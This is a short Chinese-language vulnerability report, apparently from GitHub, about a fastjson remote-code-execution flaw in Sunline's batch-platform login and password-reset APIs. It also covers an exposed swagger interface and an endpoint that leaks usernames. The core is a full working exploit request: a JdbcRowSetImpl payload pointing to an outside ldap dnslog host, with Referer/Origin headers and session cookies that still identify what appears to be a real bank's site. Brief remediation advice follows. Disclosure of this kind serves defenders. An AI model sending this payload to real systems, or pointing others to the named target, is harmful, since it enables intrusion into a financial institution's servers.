sunline

长亮sunline跑批平台接口存在fastjson命令执行漏洞

漏洞地址：

https://xxxxxxx/loader/api/uiAuth/login

https://xxxxxxx/loader/api/uiAuth/reset-password-sendmail
         
漏洞描述：长亮sunline跑批平台接口存在fastjson命令执行漏洞

漏洞详情：

1、接口存在fastjson命令执行漏洞

![image](https://github.com/ranhn/Sunline/assets/107679328/2a018bf1-faf5-4fef-84a0-e16bc44661d5)

POST /loader/api/uiAuth/reset-password-sendmail HTTP/1.1

Host: xxxxxx.com.ph

Cookie: acw_tc=0bc1a14316933660392643949e455a577eede41c8a82de5b661a2f4841446e; 

JSESSIONID=D34E1ED55B1F03E9068D984A58F487D8

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0

Accept: /

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Referer: https://bk-assistant.ownbank.com.ph/

Content-Type: application/json

If-Modified-Since: 0

Content-Length: 129

Origin: https://bk-assistant.ownbank.com.ph

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Pragma: no-cache

Cache-Control: no-cache

Te: trailers

Connection: close

{“@type”:“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“ldap://r0mkls.dnslog.cn”, “autoCommit”:true}
![image](https://github.com/ranhn/Sunline/assets/107679328/f0994785-72c3-4d76-ba7b-e17b6ab1a77a)
2、同时存在接口文档暴露问题

https://xxxxxxx.com.ph/swagger-ui.html

![image](https://github.com/ranhn/Sunline/assets/107679328/4309d4a0-e3de-49c9-baea-c0498f59ca56)

https://xxxxxxx.com.ph/loader/syncResourcesNotify/users 返回用户名

![image](https://github.com/ranhn/Sunline/assets/107679328/44cfc0a8-91cd-479a-aecc-1ed2b51d16e8)

漏洞版本：版本未知（没有版本概念）

修复建议：

1、升级到最新版本。

2、接口敏感信文档做鉴权。
